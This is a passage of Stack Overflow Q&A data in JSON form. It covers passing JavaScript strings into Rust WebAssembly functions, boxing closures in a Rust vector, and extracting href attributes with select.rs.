length.</li>\n</ol>\n\n<p><strong>lib/src.rs</strong></p>\n\n<pre class=\"lang-rust prettyprint-override\"><code>// A struct with a known memory layout that we can pass string information in\n#[repr(C)]\npub struct JsInteropString {\n    data: *const u8,\n    len: usize,\n}\n\n// Our FFI shim function    \n#[no_mangle]\npub unsafe extern \"C\" fn compute(s: *const JsInteropString, n1: i32, n2: i32) -&gt; i32 {\n    // Check for NULL (see corresponding comment in JS)\n    let s = match s.as_ref() {\n        Some(s) =&gt; s,\n        None =&gt; return -1,\n    };\n\n    // Convert the pointer and length to a `&amp;[u8]`.\n    let data = std::slice::from_raw_parts(s.data, s.len);\n\n    // Convert the `&amp;[u8]` to a `&amp;str`    \n    match std::str::from_utf8(data) {\n        Ok(s) =&gt; real_code::compute(s, n1, n2),\n        Err(_) =&gt; -2,\n    }\n}\n\n// I advocate that you keep your interesting code in a different\n// crate for easy development and testing. Have a separate crate\n// with the FFI shims.\nmod real_code {\n    pub fn compute(operator: &amp;str, n1: i32, n2: i32) -&gt; i32 {\n        match operator {\n            \"SUM\"  =&gt; n1 + n2,\n            \"DIFF\" =&gt; n1 - n2,\n            \"MULT\" =&gt; n1 * n2,\n            \"DIV\"  =&gt; n1 / n2,\n            _ =&gt; 0,\n        }\n    }\n}\n</code></pre>\n\n<p><strong>index.js</strong></p>\n\n<pre class=\"lang-js prettyprint-override\"><code>const fs = require('fs-extra');\nconst { TextEncoder } = require('text-encoding');\n\n// Allocate some memory.\nconst memory = new WebAssembly.Memory({ initial: 20, maximum: 100 });\n\n// Connect these memory regions to the imported module\nconst importObject = {\n  env: { memory }\n};\n\n// Create an object that handles converting our strings for us\nconst memoryManager = (memory) =&gt; {\n  var base = 0;\n\n  // NULL is conventionally at address 0, so we \"use up\" the first 4\n  // bytes of address space to make our lives a bit simpler.\n  base += 4;\n\n  return {\n    encodeString: (jsString) =&gt; {\n      // Convert the JS String to UTF-8 data\n      const encoder = new TextEncoder();\n      const encodedString = encoder.encode(jsString);\n\n      // Organize memory with space for the JsInteropString at the\n      // beginning, followed by the UTF-8 string bytes.\n      const asU32 = new Uint32Array(memory.buffer, base, 2);\n      const asBytes = new Uint8Array(memory.buffer, asU32.byteOffset + asU32.byteLength, encodedString.length);\n\n      // Copy the UTF-8 into the WASM memory.\n      asBytes.set(encodedString);\n\n      // Assign the data pointer and length values.\n      asU32[0] = asBytes.byteOffset;\n      asU32[1] = asBytes.length;\n\n      // Update our memory allocator base address for the next call\n      const originalBase = base;\n      base += asBytes.byteOffset + asBytes.byteLength;\n\n      return originalBase;\n    }\n  };\n};\n\nconst myMemory = memoryManager(memory);\n\nfs.readFile('./target/wasm32-unknown-unknown/release/quick_maths.wasm')\n  .then(bytes =&gt; WebAssembly.instantiate(bytes, importObject))\n  .then(({ instance }) =&gt; {\n    const argString = \"MULT\";\n    const argN1 = 42;\n    const argN2 = 100;\n\n    const s = myMemory.encodeString(argString);\n    const result = instance.exports.compute(s, argN1, argN2);\n\n    console.log(result);\n  });\n</code></pre>\n\n<p><strong>Execution</strong></p>\n\n<pre class=\"lang-none prettyprint-override\"><code>$ yarn run example\n4200\n</code></pre>\n\n<h2>Solution 2</h2>\n\n<p>I decided:</p>\n\n<ol>\n<li>To convert JS strings to UTF-8, which means that the <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/TextEncoder\" rel=\"noreferrer\"><code>TextEncoder</code></a> JS API is the best fit.</li>\n<li>The module should own the memory buffer. </li>\n<li>To have the length be a separate value.</li>\n<li>To use a <code>Box&lt;String&gt;</code> as the underlying data structure. This allows the allocation to be further used by Rust code.</li>\n</ol>\n\n<p><strong>src/lib.rs</strong></p>\n\n<pre class=\"lang-rust prettyprint-override\"><code>// Very important to use `transparent` to prevent ABI issues\n#[repr(transparent)]\npub struct JsInteropString(*mut String);\n\nimpl JsInteropString {\n    // Unsafe because we create a string and say it's full of valid\n    // UTF-8 data, but it isn't!\n    unsafe fn with_capacity(cap: usize) -&gt; Self {\n        let mut d = Vec::with_capacity(cap);\n        d.set_len(cap);\n        let s = Box::new(String::from_utf8_unchecked(d));\n        JsInteropString(Box::into_raw(s))\n    }\n\n    unsafe fn as_string(&amp;self) -&gt; &amp;String {\n        &amp;*self.0\n    }\n\n    unsafe fn as_mut_string(&amp;mut self) -&gt; &amp;mut String {\n        &amp;mut *self.0\n    }\n\n    unsafe fn into_boxed_string(self) -&gt; Box&lt;String&gt; {\n        Box::from_raw(self.0)\n    }\n\n    unsafe fn as_mut_ptr(&amp;mut self) -&gt; *mut u8 {\n        self.as_mut_string().as_mut_vec().as_mut_ptr()\n    }\n}\n\n#[no_mangle]\npub unsafe extern \"C\" fn stringPrepare(cap: usize) -&gt; JsInteropString {\n    JsInteropString::with_capacity(cap)\n}\n\n#[no_mangle]\npub unsafe extern \"C\" fn stringData(mut s: JsInteropString) -&gt; *mut u8 {\n    s.as_mut_ptr()\n}\n\n#[no_mangle]\npub unsafe extern \"C\" fn stringLen(s: JsInteropString) -&gt; usize {\n    s.as_string().len()\n}\n\n#[no_mangle]\npub unsafe extern \"C\" fn compute(s: JsInteropString, n1: i32, n2: i32) -&gt; i32 {\n    let s = s.into_boxed_string();\n    real_code::compute(&amp;s, n1, n2)\n}\n\nmod real_code {\n    pub fn compute(operator: &amp;str, n1: i32, n2: i32) -&gt; i32 {\n        match operator {\n            \"SUM\"  =&gt; n1 + n2,\n            \"DIFF\" =&gt; n1 - n2,\n            \"MULT\" =&gt; n1 * n2,\n            \"DIV\"  =&gt; n1 / n2,\n            _ =&gt; 0,\n        }\n    }\n}\n</code></pre>\n\n<p><strong>index.js</strong></p>\n\n<pre class=\"lang-js prettyprint-override\"><code>const fs = require('fs-extra');\nconst { TextEncoder } = require('text-encoding');\n\nclass QuickMaths {\n  constructor(instance) {\n    this.instance = instance;\n  }\n\n  difference(n1, n2) {\n    const { compute } = this.instance.exports;\n    const op = this.copyJsStringToRust(\"DIFF\");\n    return compute(op, n1, n2);\n  }\n\n  copyJsStringToRust(jsString) {\n    const { memory, stringPrepare, stringData, stringLen } = this.instance.exports;\n\n    const encoder = new TextEncoder();\n    const encodedString = encoder.encode(jsString);\n\n    // Ask Rust code to allocate a string inside of the module's memory\n    const rustString = stringPrepare(encodedString.length);\n\n    // Get a JS view of the string data\n    const rustStringData = stringData(rustString);\n    const asBytes = new Uint8Array(memory.buffer, rustStringData, encodedString.length);\n\n    // Copy the UTF-8 into the WASM memory.\n    asBytes.set(encodedString);\n\n    return rustString;\n  }\n}\n\nasync function main() {\n  const bytes = await fs.readFile('./target/wasm32-unknown-unknown/release/quick_maths.wasm');\n  const { instance } = await WebAssembly.instantiate(bytes);\n  const maffs = new QuickMaths(instance);\n\n  console.log(maffs.difference(100, 201));\n}\n\nmain();\n</code></pre>\n\n<p><strong>Execution</strong></p>\n\n<pre class=\"lang-none prettyprint-override\"><code>$ yarn run example\n-101\n</code></pre>\n\n<hr>\n\n<p>Note that this process can be used for other types. You \"just\" have to decide how to represent data as a set of bytes that both sides agree on then send it across.</p>\n\n<p>See also:</p>\n\n<ul>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/WebAssembly/Using_the_JavaScript_API\" rel=\"noreferrer\">Using the WebAssembly JavaScript API</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/TextEncoder\" rel=\"noreferrer\"><code>TextEncoder</code> API</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Uint8Array\" rel=\"noreferrer\"><code>Uint8Array</code></a> / <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Uint32Array\" rel=\"noreferrer\"><code>Uint32Array</code></a> / <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray\" rel=\"noreferrer\"><code>TypedArray</code></a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WebAssembly/Memory\" rel=\"noreferrer\"><code>WebAssembly.Memory</code></a></li>\n<li><a href=\"https://www.hellorust.com/demos/import-memory/index.html\" rel=\"noreferrer\">Hello, Rust! \u2014 Import memory buffer</a></li>\n<li><a href=\"https://stackoverflow.com/q/47529643/155423\">How to return a string (or similar) from Rust in WebAssembly?</a></li>\n</ul>\n"}, {"comments": [{"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1520872770, "post_id": 49225681, "comment_id": 85484159, "body": "Can you add some further prose that describes why this is different / better than the existing answer(s)?"}], "tags": [], "owner": {"reputation": 9509, "user_id": 257568, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/6c736aafc7e3bfcf9f924d09bde3aa99?s=128&d=identicon&r=PG", "display_name": "ArtemGr", "link": "https://stackoverflow.com/users/257568/artemgr"}, "is_accepted": false, "score": 2, "last_activity_date": 1521407750, "last_edit_date": 1521407750, "creation_date": 1520806325, "answer_id": 49225681, "question_id": 49014610, "link": "https://stackoverflow.com/questions/49014610/passing-a-javascript-string-to-a-rust-function-compiled-to-webassembly/49225681#49225681", "title": "Passing a JavaScript string to a Rust function compiled to WebAssembly", "body": "<p>A WebAssembly program has it's own memory space. And this space is often managed by the WebAssembly program itself, with the help of an allocator library, such as the <a href=\"http://fitzgeraldnick.com/2018/02/09/wee-alloc.html\" rel=\"nofollow noreferrer\">wee_alloc</a>.</p>\n\n<p>The JavaScript can see and modify that memory space, but it has no way of knowing how the allocator library structures are organized. So if we simply write to the WASM memory from the JavaScript then we'll likely overwrite something important and mess things up. Therefore the WebAssembly program itself must allocate the memory region first, pass it to JavaScript, and then the JavaScript can fill that region with the data.</p>\n\n<p>In the following example we do just that: allocate a buffer in the WASM memory space, copy the UTF-8 bytes there, pass the buffer location to a Rust function, then free the buffer.</p>\n\n<p>Rust:</p>\n\n<pre class=\"lang-rust prettyprint-override\"><code>#![feature(allocator_api)]\n\nuse std::heap::{Alloc, Heap, Layout};\n\n#[no_mangle]\npub fn alloc(len: i32) -&gt; *mut u8 {\n    let mut heap = Heap;\n    let layout = Layout::from_size_align(len as usize, 1).expect(\"!from_size_align\");\n    unsafe { heap.alloc(layout).expect(\"!alloc\") }\n}\n\n#[no_mangle]\npub fn dealloc(ptr: *mut u8, len: i32) {\n    let mut heap = Heap;\n    let layout = Layout::from_size_align(len as usize, 1).expect(\"!from_size_align\");\n    unsafe { heap.dealloc(ptr, layout) }\n}\n\n#[no_mangle]\npub fn is_foobar(buf: *const u8, len: i32) -&gt; i32 {\n    let js = unsafe { std::slice::from_raw_parts(buf, len as usize) };\n    let js = unsafe { std::str::from_utf8_unchecked(js) };\n    if js == \"foobar\" {\n        1\n    } else {\n        0\n    }\n}\n</code></pre>\n\n<p>TypeScript:</p>\n\n<pre class=\"lang-js prettyprint-override\"><code>// cf. https://github.com/Microsoft/TypeScript/issues/18099\ndeclare class TextEncoder {constructor (label?: string); encode (input?: string): Uint8Array}\ndeclare class TextDecoder {constructor (utfLabel?: string); decode (input?: ArrayBufferView): string}\n// https://github.com/DefinitelyTyped/DefinitelyTyped/blob/master/types/webassembly-js-api/index.d.ts\ndeclare namespace WebAssembly {\n  class Instance {readonly exports: any}\n  interface ResultObject {instance: Instance}\n  function instantiateStreaming (file: Promise&lt;Response&gt;, options?: any): Promise&lt;ResultObject&gt;}\n\nvar main: {\n  memory: {readonly buffer: ArrayBuffer}\n  alloc (size: number): number\n  dealloc (ptr: number, len: number): void\n  is_foobar (buf: number, len: number): number}\n\nfunction withRustString (str: string, cb: (ptr: number, len: number) =&gt; any): any {\n  // Convert the JavaScript string to an array of UTF-8 bytes.\n  const utf8 = (new TextEncoder()).encode (str)\n  // Reserve a WASM memory buffer for the UTF-8 array.\n  const rsBuf = main.alloc (utf8.length)\n  // Copy the UTF-8 array into the WASM memory.\n  new Uint8Array (main.memory.buffer, rsBuf, utf8.length) .set (utf8)\n  // Pass the WASM memory location and size into the callback.\n  const ret = cb (rsBuf, utf8.length)\n  // Free the WASM memory buffer.\n  main.dealloc (rsBuf, utf8.length)\n  return ret}\n\nWebAssembly.instantiateStreaming (fetch ('main.wasm')) .then (results =&gt; {\n  main = results.instance.exports\n  // Prints \"foobar is_foobar? 1\".\n  console.log ('foobar is_foobar? ' +\n    withRustString (\"foobar\", function (buf, len) {return main.is_foobar (buf, len)}))\n  // Prints \"woot is_foobar? 0\".\n  console.log ('woot is_foobar? ' +\n    withRustString (\"woot\", function (buf, len) {return main.is_foobar (buf, len)}))})\n</code></pre>\n\n<p>P.S. <a href=\"https://kripken.github.io/emscripten-site/docs/porting/connecting_cpp_and_javascript/Interacting-with-code.html#access-memory-from-javascript\" rel=\"nofollow noreferrer\">The <code>Module._malloc</code> in Emscripten</a> might be semantically equivalent to the <code>alloc</code> function we implemented above. Under the \"wasm32-unknown-emscripten\" target <a href=\"https://bojandjurdjevic.com/2018/WASM-vs-JS-Realtime-pitch-detection/\" rel=\"nofollow noreferrer\">you can use the <code>Module._malloc</code> with Rust</a>.</p>\n"}], "owner": {"reputation": 1097, "user_id": 2432221, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/bed6ad096ee60b399a63414cc8448453?s=128&d=identicon&r=PG", "display_name": "vinzdef", "link": "https://stackoverflow.com/users/2432221/vinzdef"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2833, "favorite_count": 4, "accepted_answer_id": 49020435, "answer_count": 3, "score": 7, "last_activity_date": 1558710404, "creation_date": 1519752546, "last_edit_date": 1519759546, "question_id": 49014610, "link": "https://stackoverflow.com/questions/49014610/passing-a-javascript-string-to-a-rust-function-compiled-to-webassembly", "title": "Passing a JavaScript string to a Rust function compiled to WebAssembly", "body": "<p>I have this simple Rust function:</p>\n\n<pre><code>#[no_mangle]\npub fn compute(operator: &amp;str, n1: i32, n2: i32) -&gt; i32 {\n    match operator {\n        \"SUM\" =&gt; n1 + n2,\n        \"DIFF\" =&gt; n1 - n2,\n        \"MULT\" =&gt; n1 * n2,\n        \"DIV\" =&gt; n1 / n2,\n        _ =&gt; 0\n    }\n}\n</code></pre>\n\n<p>I am compiling this to WebAssembly successfully, but don't manage to pass the <code>operator</code> parameter from JS to Rust.</p>\n\n<p>The JS line which calls the Rust function looks like this:</p>\n\n<pre><code>instance.exports.compute(operator, n1, n2);\n</code></pre>\n\n<p><code>operator</code> is a JS <code>String</code> and <code>n1</code>, <code>n2</code> are JS <code>Number</code>s.</p>\n\n<p><code>n1</code> and <code>n2</code> are passed properly and can be read inside the compiled function so I guess the problem is how I pass the string around. I imagine it is passed as a pointer from JS to WebAssembly but can't find evidence or material about how this works.</p>\n\n<p>I am not using Emscripten and would like to keep it standalone (compilation target <code>wasm32-unknown-unknown</code>), but I see they wrap their compiled functions in <code>Module.cwrap</code>, maybe that could help?</p>\n"}, {"tags": ["rust", "closures", "boxing"], "answers": [{"comments": [{"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519746653, "post_id": 49012682, "comment_id": 85030051, "body": "Although this answer shows the correct end code, the OP <i>already</i> tried boxing the closures, as shown in the question. Lifetimes also do not play a part in the problem."}, {"owner": {"reputation": 19105, "user_id": 3005167, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/t0bMQ.png?s=128&g=1", "display_name": "kazemakase", "link": "https://stackoverflow.com/users/3005167/kazemakase"}, "reply_to_user": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519746921, "post_id": 49012682, "comment_id": 85030241, "body": "@Shepmaster What lifetimes are you referring to?"}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519747327, "post_id": 49012682, "comment_id": 85030555, "body": "That was a poor choice of words on my part. I was referring to your statement &quot;the closures are temporary and the vector would outlive them&quot;. They are not <i>temporary</i>, the <code>Vec</code> would own them, it&#39;s just that you cannot own the concrete value and have the <code>Vec</code>&#39;s type be a reference."}, {"owner": {"reputation": 19105, "user_id": 3005167, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/t0bMQ.png?s=128&g=1", "display_name": "kazemakase", "link": "https://stackoverflow.com/users/3005167/kazemakase"}, "reply_to_user": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519747737, "post_id": 49012682, "comment_id": 85030843, "body": "@Shepmaster The error message seems to suggest the problem could be solved without boxing. My intent was to point out why this fails, but forgot to insert the <code>&amp;</code>s. In that case there is actually a lifetime issue."}], "tags": [], "owner": {"reputation": 19105, "user_id": 3005167, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/t0bMQ.png?s=128&g=1", "display_name": "kazemakase", "link": "https://stackoverflow.com/users/3005167/kazemakase"}, "is_accepted": false, "score": 3, "last_activity_date": 1519750662, "last_edit_date": 1519750662, "creation_date": 1519746500, "answer_id": 49012682, "question_id": 49012277, "link": "https://stackoverflow.com/questions/49012277/how-to-create-a-vector-of-boxed-closures-in-rust/49012682#49012682", "title": "How to create a vector of boxed closures in Rust?", "body": "<p>You should read the suggestion in the error message as <em>\"consider boxing your closure and using it as a trait object, or using it just as a trait object\"</em>. </p>\n\n<p>Using trait object references without boxing them will not work here because nothing owns the closures. The references in the vector would outlive the closures:</p>\n\n<pre><code>// This fails\nlet xs: Vec&lt;&amp;Fn((i32, i32)) -&gt; (i32, i32)&gt; = vec![ \n    &amp;move |(x, y)| (y, x), \n    &amp;move |(x, y)| (1 - y, 1 - x),\n];\n</code></pre>\n\n<p>The vector needs to take ownership of the closures, which is where boxing the trait objects comes into play:</p>\n\n<pre><code>let xs: Vec&lt;Box&lt;Fn((i32, i32)) -&gt; (i32, i32)&gt;&gt; = vec![ \n    Box::new(move |(x, y)| (y, x)), \n    Box::new(move |(x, y)| (1 - y, 1 - x)),\n];\n</code></pre>\n\n<p>This explicitly tells the compiler that the vector can contain boxes of any closure with the same interface.</p>\n"}, {"tags": [], "owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "is_accepted": true, "score": 19, "last_activity_date": 1556491891, "last_edit_date": 1556491891, "creation_date": 1519747149, "answer_id": 49012896, "question_id": 49012277, "link": "https://stackoverflow.com/questions/49012277/how-to-create-a-vector-of-boxed-closures-in-rust/49012896#49012896", "title": "How to create a vector of boxed closures in Rust?", "body": "<p>The problem is that type inference has kicked in before you wanted it to. Conceptually, it's like this:</p>\n\n<pre><code>let mut xs: Vec&lt;_&gt; = Vec::new();\nxs.push(Type1);\nxs.push(Type2);\n</code></pre>\n\n<p>When the first value is seen, the type of the <code>Vec</code>'s elements is inferred to be of that type. The second element then causes a mismatch.</p>\n\n<p>Even when you <code>Box</code> the values, you have the same problem:</p>\n\n<pre><code>let mut xs: Vec&lt;_&gt; = Vec::new();\nxs.push(Box::new(Type1));\nxs.push(Box::new(Type2));\n</code></pre>\n\n<p>Looking at it another way, you never actually created a trait object. You have a <code>Box&lt;ConcreteType&gt;</code>, not a <code>Box&lt;dyn Trait&gt;</code>.</p>\n\n<p>The solution is to cast the boxed concrete types to the <em>boxed trait object</em>:</p>\n\n<pre><code>let mut xs: Vec&lt;_&gt; = Vec::new();\nxs.push(Box::new(Type1) as Box&lt;dyn Trait&gt;);\nxs.push(Box::new(Type2) as Box&lt;dyn Trait&gt;);\n</code></pre>\n\n<p>The <em>second</em> <code>push</code> can have the type coerced automatically, so you can choose to leave the <code>as</code> bit off of that line.</p>\n\n<p>Rolling this back up to the original problem:</p>\n\n<pre><code>let xs: Vec&lt;_&gt; = vec![\n    Box::new(move |(x, y)| (y, x)) as Box&lt;dyn Fn((i32, i32)) -&gt; (i32, i32)&gt;,\n    Box::new(move |(x, y)| (1 - y, 1 - x)),\n];\n</code></pre>\n\n<p>Or you can avoid the inference at all by specifying the type on the variable, my preferred style for this:</p>\n\n<pre><code>let xs: Vec&lt;Box&lt;dyn Fn((i32, i32)) -&gt; (i32, i32)&gt;&gt; = vec![\n    Box::new(move |(x, y)| (y, x)),\n    Box::new(move |(x, y)| (1 - y, 1 - x)),\n];\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user8370684"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3055, "favorite_count": 1, "accepted_answer_id": 49012896, "answer_count": 2, "score": 8, "last_activity_date": 1556491891, "creation_date": 1519745203, "last_edit_date": 1519745655, "question_id": 49012277, "link": "https://stackoverflow.com/questions/49012277/how-to-create-a-vector-of-boxed-closures-in-rust", "title": "How to create a vector of boxed closures in Rust?", "body": "<p>Previously <a href=\"https://stackoverflow.com/questions/27491196/rust-array-of-functions\">a question</a> was asked about creating an array of functions where the functions returned integers from a range. The final solution was to do a map/collect into a <code>Vec&lt;_&gt;</code>. </p>\n\n<p>I have a similar yet different situation where I have closures with the same signature but different implementations. I tried this:</p>\n\n<pre><code>let xs: Vec&lt;_&gt; = vec![\n    move |(x, y)| (y, x),\n    move |(x, y)| (1 - y, 1 - x),\n];\n</code></pre>\n\n<p>The error I get back:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>error[E0308]: mismatched types\n --&gt; src/main.rs:4:9\n  |\n4 |         move |(x, y)| (1 - y, 1 - x),\n  |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected closure, found a different closure\n  |\n  = note: expected type `[closure@src/main.rs:3:9: 3:29]`\n             found type `[closure@src/main.rs:4:9: 4:37]`\n  = note: no two closures, even if identical, have the same type\n  = help: consider boxing your closure and/or using it as a trait object\n</code></pre>\n\n<p>I tried boxing:</p>\n\n<pre><code>let xs: Vec&lt;_&gt; = vec![\n    Box::new(move |x: u8, y: u8| (y, x)),\n    Box::new(move |x: u8, y: u8| (1 - y, 1 - x)),\n];\n</code></pre>\n\n<p>I get back the same error:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>error[E0308]: mismatched types\n --&gt; src/main.rs:4:18\n  |\n4 |         Box::new(move |x: u8, y: u8| (1 - y, 1 - x)),\n  |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected closure, found a different closure\n  |\n  = note: expected type `[closure@src/main.rs:3:18: 3:44]`\n             found type `[closure@src/main.rs:4:18: 4:52]`\n  = note: no two closures, even if identical, have the same type\n  = help: consider boxing your closure and/or using it as a trait object\n</code></pre>\n\n<p>What is the right way to box closures so that they can be put into a vector (or an array)?</p>\n"}, {"tags": ["http", "rust"], "comments": [{"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519739472, "post_id": 49010091, "comment_id": 85024944, "body": "You have forgotten to state what the <i>problem</i> with your code is. On the surface, it looks like it would work."}, {"owner": {"reputation": 31, "user_id": 5305442, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mInKb.jpg?s=128&g=1", "display_name": "Saeed KhademiDoroh", "link": "https://stackoverflow.com/users/5305442/saeed-khademidoroh"}, "reply_to_user": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519747140, "post_id": 49010091, "comment_id": 85030406, "body": "The problem is with the last part, as i mentioned i need help writing the &quot;for-iteration&quot; part of my code."}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519747391, "post_id": 49010091, "comment_id": 85030601, "body": "You&#39;ve <i>already</i> written that part though. From your code: <code>for node in document.find(Attr(&quot;id&quot;, &quot;hmenus&quot;)).find(Name(&quot;a&quot;)).iter()</code>. That is a for loop. It iterates. It is unclear exactly what the problem is."}, {"owner": {"reputation": 31, "user_id": 5305442, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mInKb.jpg?s=128&g=1", "display_name": "Saeed KhademiDoroh", "link": "https://stackoverflow.com/users/5305442/saeed-khademidoroh"}, "reply_to_user": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519747830, "post_id": 49010091, "comment_id": 85030911, "body": "Well i edited the question accordingly and specified the problem in &quot;for-iteration&quot; part of the code, sorry for the misunderstanding, i hope it helps."}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519748868, "post_id": 49010091, "comment_id": 85031573, "body": "<i>it seems that [...] isn&#39;t the right way</i> \u2014 but <b>why</b> does it not &quot;seem&quot; like the right way? Are you getting a compilation error, a runtime error, incorrect/malformed data, etc.? <i>I believe rewritting this part should fix the problem</i> \u2014 you still haven&#39;t said what the problem you are getting <i>is</i>."}, {"owner": {"reputation": 31, "user_id": 5305442, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mInKb.jpg?s=128&g=1", "display_name": "Saeed KhademiDoroh", "link": "https://stackoverflow.com/users/5305442/saeed-khademidoroh"}, "reply_to_user": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519750143, "post_id": 49010091, "comment_id": 85032401, "body": "There is absolutely no compilation error, the problem here is that the <code>println!(&quot;{} ({:?})&quot;, node.text(), node.attr(&quot;href&quot;).unwrap())</code> doesn&#39;t output anything since the <code>[...].iter()</code> is not working correctly. The problem is not with compile/runtime errors, the problem is my lack of knowledge to work with <code>select.rs</code> module."}], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 5305442, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mInKb.jpg?s=128&g=1", "display_name": "Saeed KhademiDoroh", "link": "https://stackoverflow.com/users/5305442/saeed-khademidoroh"}, "edited": false, "score": 0, "creation_date": 1519755940, "post_id": 49014999, "comment_id": 85035822, "body": "Thank you for your answer, this code solved my problem."}], "tags": [], "owner": {"reputation": 6357, "user_id": 6086311, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb99289473f6393b89474785f2d294d1?s=128&d=identicon&r=PG", "display_name": "dtolnay", "link": "https://stackoverflow.com/users/6086311/dtolnay"}, "is_accepted": true, "score": 1, "last_activity_date": 1519754064, "creation_date": 1519754064, "answer_id": 49014999, "question_id": 49010091, "link": "https://stackoverflow.com/questions/49010091/how-do-i-extract-the-href-attributes-from-a-html-document-with-select-rs/49014999#49014999", "title": "How do I extract the &quot;href&quot; attributes from a HTML document with select.rs?", "body": "<p>I assume you copied the <code>Attr(\"id\", \"hmenus\")</code> from some example code. This is a filter predicate that matches an HTML node containing attribute <code>id=\"hmenus\"</code>. Your example page um.ac.ir does not contain any nodes with attribute <code>id=\"hmenus\"</code>. If you want the crawler to find <strong>all</strong> &lt;a&gt; nodes on the page, the filter predicate would be <code>Name(\"a\")</code>.</p>\n\n<pre><code>for node in document.find(Name(\"a\")).iter() {\n    if let Some(href) = node.attr(\"href\") {\n        println!(\"{} ({:?})\", node.text().trim(), href);\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 5305442, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mInKb.jpg?s=128&g=1", "display_name": "Saeed KhademiDoroh", "link": "https://stackoverflow.com/users/5305442/saeed-khademidoroh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, 